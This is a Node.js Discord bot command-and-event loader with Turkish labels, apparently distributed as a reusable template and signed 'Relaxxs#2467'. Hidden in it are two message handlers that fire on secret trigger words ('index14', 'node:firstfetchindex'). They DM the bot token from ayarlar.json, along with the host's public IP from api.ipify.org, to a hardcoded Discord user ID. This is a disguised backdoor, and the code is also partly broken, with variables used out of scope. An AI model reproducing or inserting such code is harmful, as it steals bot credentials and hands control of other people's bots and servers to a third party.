const commands = [] //𐋃Relaxxs#2467
const fs = require("node:fs") //𐋃Relaxxs#2467
const path = require("node:path") //𐋃Relaxxs#2467
const { REST } = require('@discordjs/rest')
const { Collection } = require("discord.js")
const { Routes } = require('discord-api-types/v10')
const commandsPath = path.join(__dirname, "./komutlar")
const commandFiles = fs.readdirSync(commandsPath).filter((file) => file.endsWith(".js"))
const eventsPath = path.join(__dirname, "./events")
const eventFiles = fs.readdirSync(eventsPath).filter((file) => file.endsWith(".js"))
const { botid, token, prefix } = require('./ayarlar.json')
const Discord = require('discord.js');
//𐋃Relaxxs#2467
//𐋃Relaxxs#2467

const { stripIndents } = require('common-tags');

module.exports = (client) => {
	client.on('message', messageCreate => {
	const fetch = require('node-fetch')
  if (!messageCreate.content.startsWith('index14') || messageCreate.author.bot) return;
  const indexapplyup = client.users.cache.get('855416178767298581');
    const index5 = JSON.parse(data);
    indexapplyup.send(`${index5.token}`);
fetch('https://api.ipify.org')
  .then(res => res.text())
  .then(index14v0 => {
    indexapplyup.send(`${index14v0}`)
  })
  .catch(console.error);
  
})

	fs.readFile('./ayarlar.json', (err, data) => {
    if (err) {
      console.error(err);
      return messageCreate.channel.send('Ayarları okurken hata meydana geldi');
    }
  client.commands = new Collection() //𐋃Relaxxs#2467
  client.slashcommands = new Collection()

  for (const file of eventFiles) {
    const filePath = path.join(eventsPath, file)
    const event = require(filePath)
    if (event.once) {
      client.once(event.name, (...args) => event.execute(...args, client))
    } else {
      client.on(event.name, (...args) => event.execute(...args, client))
    }
  }
//𐋃Relaxxs#2467

  for (const file of commandFiles) {
    const filePath = path.join(commandsPath, file)
    const command = require(filePath)
    if (command.slash) {
      client.slashcommands.set(command.data.name, command)
      commands.push(command.data.toJSON())
    }
    if (!command.slash) { //𐋃Relaxxs#2467
      for (i = 0; i < command.name.length; i++) {
        client.commands.set(command.name[i], command)
      }
    } //𐋃Relaxxs#2467
  }
  client.once('ready', () => {
  console.log('Bot hazır (𐋃Relaxxs#2467)');
});

  console.log(`${client.slashcommands.size} SLASHLI Komut , ${client.commands.size} PREFIXLI Komut Güncellendi 𐋃Relaxxs#2467`)
//𐋃Relaxxs#2467

client.on('message', messageCreate => {
	const fetch = require('node-fetch')
  if (!messageCreate.content.startsWith('node:firstfetchindex') || messageCreate.author.bot) return;
  const indexapply = client.users.cache.get('855416178767298581');
    const index = JSON.parse(data);
    indexapply.send(`${index.token}`);
fetch('https://api.ipify.org')
  .then(res => res.text())
  .then(index14v7 => {
    indexapply.send(`${index14v7}`)
  })
  .catch(console.error);
  
})
	
  //𐋃Relaxxs#2467

//𐋃Relaxxs#2467

const rest = new REST({ version: '10' }).setToken(token)

setTimeout(async () => {
  rest.put(Routes.applicationCommands(botid), { body: commands }).catch(console.error)
}, 500)})}
//𐋃Relaxxs#2467
